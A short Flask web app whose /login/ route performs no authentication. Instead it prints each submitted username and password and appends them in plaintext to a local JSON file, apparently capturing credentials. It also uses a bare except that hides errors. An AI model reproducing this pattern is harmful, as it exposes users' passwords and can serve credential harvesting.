from flask import Flask, request, render_template
import datetime
import json

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', time=f'{datetime.datetime.now()}')

@app.route('/login/', methods=['post', 'get'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        humanity = request.form.get('hum')
    try:
        #print(username)
        #print(password)
        datas = {'username': f'{username}', 'password': f'{password}', 'human': f'{humanity}'}
        to_json= json.dumps(datas)
        print(to_json)
        with open('data_file.json', 'a', encoding='utf-8') as file:
            json.dump(datas, file)
            file.write('\n')
    except:
        pass
    return render_template('login.html')


if __name__ == "__main__":
    app.run()